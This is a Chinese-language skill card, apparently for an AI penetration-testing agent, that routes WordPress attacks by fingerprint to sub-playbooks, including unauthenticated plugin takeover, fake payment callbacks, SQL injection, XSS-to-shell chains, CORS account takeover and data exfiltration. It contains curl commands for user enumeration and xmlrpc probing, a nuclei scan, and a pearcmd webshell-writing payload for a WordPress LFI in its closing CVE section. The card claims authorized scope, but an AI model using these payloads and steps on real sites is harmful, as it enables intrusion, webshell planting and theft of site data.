---
name: wordpress-attack-router
description: >-
  WordPress 攻击场景分流路由。目标出现 WordPress 指纹（wp-login、wp-includes、
  wp-content、wp-json、xmlrpc.php、wp2shell 等）时，根据具体场景分流到对应的
  Skill 或 Playbook。用户提到 WordPress、WP 插件漏洞、WP 后台、WP Shell、
  WP 假付 callback 时使用本路由卡，然后再读对应子卡。
---

# WordPress 攻击场景分流（Family Router）

**前提**：目标已在 `config/scope*.json`。

## 指纹识别

```bash
python3 tools/ops/stdlib_fallback.py cms_fingerprint -- -u https://授权站
curl -sk https://TARGET/ | grep -iE "wp-content|wp-includes|wp-login|WordPress"
curl -sk https://TARGET/wp-json/wp/v2/users | python3 -m json.tool  # 用户枚举
curl -sk https://TARGET/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
```

## 场景分流表

| 场景 | 触发特征 | 走哪张卡 / Playbook |
|------|----------|---------------------|
| **xmlrpc 暴露面** | `xmlrpc.php` 可访问 / `system.multicall` | Skill `wordpress-xmlrpc-surface` |
| **插件未授权 / 假付 callback** | REST API 越权 / `woocommerce-payments` callback | Skill `wordpress-plugin-unauth-takeover` |
| **已落地 Shell 狩猎** | 高熵11位随机 `.php` / webshell痕迹 | Playbook `WordPress高熵PHP马落点狩猎.md` |
| **JetEngine 未授权 RCE** | `jet-engine` / `CVE-2026-66613` / SSTI | Skill `jetengine-unauth-rce` · Playbook `WordPress-JetEngine未授权RCE手法.md` |
| **Easy Digital Downloads 越权** | EDD plugin / `CVE-2026-39503` / `CVE-2026-59524` | Playbook `WordPress-EDD未授权越权手法.md`（发卡站走 `faka-card-shop-pentest`） |
| **Premium Packages SQLi** | `wpdm-premium-packages` / `CVE-2026-12800` | Playbook `WordPress-PremiumPackages未授权SQLi手法.md` |
| **REST 注入 / RCE** | `/wp-json/` 注入 / `CVE-2026-60137` / `CVE-2026-63030` | Playbook `WordPress-REST注入RCE手法.md` |
| **登录 XSS → Shell 链** | `CVE-2026-64638` / XSS2Shell / 有管理员账号 | Playbook `WordPress登录XSS链手法.md` |
| **xmlrpc 高熵马写入/扫已落马** | 授权站已有 webshell / `wp-shell-drop-hunt` | Skill `wp-shell-drop-hunt` |
| **REST API CORS → ATO 链** | `/wp-json/` 反射 Origin + ACAC:true / 密码重置 Host 注入 | Skill `wp-rest-cors-ato` |
| **WPDA 匿名数据泄露** | `/wp-json/wpda/` 命名空间 / `PP_APP_CONFIG` / `pp_app_` / `authorization:"anonymous"` | Skill `wpda-anonymous-data-exfil`（IDOR + LOV defaultWhere 绕过 + FormData 鉴权绕过） |
| **CVE-2026-87902 Core LFI/RCE** | WP Core 4.7.0–7.1.1 / 无任何凭据 / POST pagename 双编码穿越 / theme 含 `page-*` 目录 | Playbook `WordPress-CVE-2026-87902-LFI-RCE手法.md`（两段 PEAR 链写 shell；无 PEAR 则 LFI 读 wp-config） |

## 决策流程

```
WordPress 指纹
   │
   ├─ xmlrpc.php 可达？ → wordpress-xmlrpc-surface（先探方法列表）
   ├─ 发现具体插件？→ 对照分流表找对应卡
   ├─ REST API /wp-json 可达？→ 先枚举 namespace → wpda 命中走 wpda-anonymous-data-exfil → 再测 CORS（wp-rest-cors-ato）→ 再看插件（wordpress-plugin-unauth-takeover）
   ├─ 疑似已落地马？→ WordPress高熵PHP马落点狩猎.md
   ├─ CVE 指纹（JetEngine / EDD / PP / REST / **CVE-2026-87902**）？→ 对应 Playbook
  ├─ **WP 版本 ≤ 7.1.1 + 无管理后台捷径**？→ WordPress-CVE-2026-87902-LFI-RCE手法.md（先探 page_id → 检查 theme `page-*` 目录 → 两段 PEAR 链）
   ├─ 有后台凭据 + XSS 场景？→ WordPress登录XSS链手法.md
   └─ 无明显指纹→ core_web_surface_probe 扫全面
```

## 通用 WP 快速踩点命令

```bash
# 版本 / 用户枚举 / 路径探测
curl -sk https://TARGET/wp-json/wp/v2/users?per_page=100
curl -sk https://TARGET/?author=1 -I | grep -i location
curl -sk https://TARGET/readme.html | grep "WordPress"
# 插件指纹
curl -sk https://TARGET/wp-content/plugins/ | grep -oE 'href="[^"]+/"' | head -20
# 快速扫描
nuclei -t tools/1day-kit/custom-templates/ -tags wordpress -u https://TARGET -silent
```

## 禁止

- 未确认插件版本就盲打 exploit
- xmlrpc multicall：授权内对自控号可做，禁止无差别百万撞密
- XSS2Shell：授权内对自控会话直接做，不对无关管理员钓鱼
- 高熵马路径写入非授权站

## 真源

- 主路由：本 Skill
- 各子场景见上表对应卡
- 已落地马溯源入口：`docs/playbooks/WordPress高熵PHP马落点狩猎.md`
- 工具：`python3 tools/ops/wp_plugin_unauth_probe.py --help`

## 2026Q3 新洞：CVE-2026-87902 get_page_template LFI→条件RCE

- 影响 **WordPress 4.7.0–7.1.1**，修复 7.1.2；CVSS 8.1，未认证。
- 原理：`get_page_template()` 的 page-template 解析可包含活动主题目录之外的可读 `.php` 文件（`page-*` 命名 + 路径穿越）。
- 三个前置必须同时成立：① 主题下存在 `page-*.php` 系列目录/文件；② `register_argc_argv=On`（pearcmd.php 可被 argv 调用）；③ 可读 `pearcmd.php`。
- 利用路径：LFI 读 pearcmd → `?+config-create+/<?=eval($_POST[x])?>+/tmp/shell.php` 写马（经典 pearcmd 链）。
- 扫描器/PoC：`github.com/dinosn/cve-2026-87902-wordpress-lfi-lab`。
- 判型：先打 `/?p=1&page_id=...` 类 page-template 参数，看是否回显主题外文件；再查 phpinfo/`register_argc_argv`。
- 情报源：`1day-nuclei-kit/references/77169-intel-2026q3.md`。
